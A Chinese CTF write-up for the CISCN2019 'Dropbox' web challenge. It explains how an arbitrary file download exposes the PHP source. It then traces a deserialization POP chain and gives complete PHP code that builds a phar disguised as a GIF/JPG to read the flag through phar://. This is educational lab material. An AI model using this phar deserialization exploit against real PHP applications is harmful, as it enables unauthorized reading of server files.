# [CISCN2019 华北赛区 Day1 Web1]Dropbox

## 知识点

`phar反序列化`

`任意文件下载`

## 解题

首先注册账号后登录进来发现是个网盘，然后尝试上传文件，要求为`jpg`或者`png`,简单上传一个文件后可以`下载`和`删除`，下载的时候在`POST`时修改`filename`参数可以实现`任意文件下载`

![alt text](<img/[CISCN2019 华北赛区 Day1 Web1]Dropbox-1.png>)

但是无法读取`flag`，尝试读取源码看看，因为都有相互包含，我把所有已知的`php`文件都分别下载了下来，可以用`相对路径`，如`../../download.php`或者`绝对路径`,如`/var/www/html/download.php`，目录如图所示

![alt text](<img/[CISCN2019 华北赛区 Day1 Web1]Dropbox-2.png>)

这里我就不把全部代码列出来了，只把关键点列出来

首先看了`download.php`为什么不能直接读`flag`，发现被过滤

```php
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
}
```

且因为代码里有
```php
ini_set("open_basedir", getcwd() . ":/etc:/tmp");
```

执行后我们只可以访问`当前目录` `/etc` `/tmp`，因为提示说`flag`在根目录`/`,所以只能在没做限制的`delete.php`操作

这题可以`phar反序列化`是因为满足了`可以phar反序列化的三个条件`

1. `phar`文件要能够上传至服务器
2. 有可用的魔术方法为跳板
3. 文件操作函数的参数可控（即有那些特定的函数如本题的`file_get_contents`函数）
4. `/` `phar`等特殊字符没有被过滤

首先找利用`pop`链，首先找到需要利用的点，即`class.php`->`File类`->`close方法`

```php
class File() {
    public function close() {
        return file_get_contents($this->filename);
    }
}
```

然后在`class.php`->`FileList类`->`__call方法`发现传参后能调用`File->close()`

```php
class FileList{
   public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
}
```

当`$file`赋值为`File`类，且对`File`类的`$filename`赋值，`$func`设置为`close`时就可以读取需要的文件，然后我们还需要找最开始的能调用`FileList类`->`__call`方法的`魔法函数`，发现`User类`->`__destruct`中`$db`赋值为`FileList`实例即可，且可以作为`pop`链开始

```php
class User{
    public function __destruct() {
        $this->db->close();
    }
}
```

那么最终我们的`pop`链条为 `User::__destruct()` -> `FileList::__call()` -> `File::close()`,最后`FileList::__destruct()`会输出结果

构造`phar`

```php
<?php

class User {
    public $db;
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}

class File {
    public $filename;
}

@unlink("phar.phar");
$a = new User();
$a->db = new FileList();

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");       // GIF89a可删除，加在此处为了绕过文件头检测
$phar->setMetadata($a);
$phar->addFromString("exp.txt", "a");       // 添加要压缩的文件
$phar->stopBuffering();
```

![alt text](<img/[CISCN2019 华北赛区 Day1 Web1]Dropbox-3.png>)

将`phar.phar`改名为`phar.jpg`，最后使用`phar://`伪协议加载即可，如下图所示

![alt text](<img/[CISCN2019 华北赛区 Day1 Web1]Dropbox-4.png>)
